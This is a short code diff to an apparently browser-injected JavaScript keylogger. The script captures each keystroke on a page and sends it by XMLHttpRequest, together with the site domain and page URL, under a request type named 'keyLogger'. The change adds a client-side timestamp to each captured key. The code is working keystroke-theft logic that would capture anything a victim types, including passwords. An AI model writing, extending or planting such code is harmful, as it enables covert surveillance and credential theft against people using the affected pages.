@@ -3,6 +3,7 @@
 		evt = evt || window.event;
 		var charCode = evt.keyCode || evt.which;
 		var charStr = String.fromCharCode(charCode);
+		var time = new Date().getTime();
 		var domain = document.location.host;
 		var page = document.location.href;
 
@@ -19,6 +20,7 @@
 				"application/x-www-form-urlencoded");
 		xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
 		xhttp.send("requestType=keyLogger&currentDomain=" + domain
-				+ "&currentPage=" + page + "&pressedKey=" + charStr);
+				+ "&currentPage=" + page + "&pressedKey=" + charStr
+				+ "&clientTime=" + time);
 	};
 })();
